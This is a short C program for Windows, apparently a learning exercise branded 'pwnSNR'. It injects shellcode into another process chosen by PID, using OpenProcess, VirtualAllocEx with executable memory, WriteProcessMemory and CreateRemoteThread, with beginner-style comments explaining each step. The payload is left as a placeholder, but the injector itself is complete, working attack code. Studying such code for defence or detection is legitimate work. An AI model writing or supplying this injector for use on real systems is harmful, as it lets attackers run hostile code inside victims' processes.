#include <Windows.h>
#include <stdio.h>

DWORD PID = 0, TID = 0;
const char* k = "[+]";
const char* i = "[*]";
const char* e = "[!]";

HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

unsigned char Shellus[] = "YOUR SHELL CODE HERE";

int main(int argc, char *argv[]) {

    if (argc < 2){
        printf("%s usage: compiled.exe <PID>",e);
        return EXIT_FAILURE;
    }

    //assign whatever we supply to PID
    //atoi = a string that represents an integer. (convert the input into an integer)
    //its not [0] because [0] is the program itself.
    PID = atoi(argv[1]);
    //%ld is a how you format a double word or a dword or an unsigned long. and for %l is just a long. %ld = long decimal
    printf("%s Opening handle to process (%ld)\n",i,PID); 


    //Now we need a handle to the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess == NULL){
        printf("%s couldn't get a handle on process (%ld), error: %ld",e,PID,GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s Handle Success #0xSNRED.\n\\---0x%p\n",k,hProcess);

    //Now we need to allocate our bytes into our process memory.
    rBuffer = VirtualAllocEx(hProcess,NULL,sizeof Shellus,(MEM_COMMIT|MEM_RESERVE),PAGE_EXECUTE_READWRITE);
    printf("%s Successfully allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n",k,sizeof(Shellus));

    WriteProcessMemory(hProcess, rBuffer, Shellus, sizeof(Shellus), NULL);
    printf("%s Successfully wrote %zu-bytes to process memory.\n",k,sizeof(Shellus));

    //Now create a thread to actually run the payload
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, &TID);
    if (hThread == NULL) {
        printf("%s failed to get a handle on thread, error: %ld",e,GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the thread (%ld)\n\\---0x%p",k,TID,hThread);

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s finished! [#SNRED]. Thanks for using pwnSNR.\n",k);

    return EXIT_SUCCESS;
}
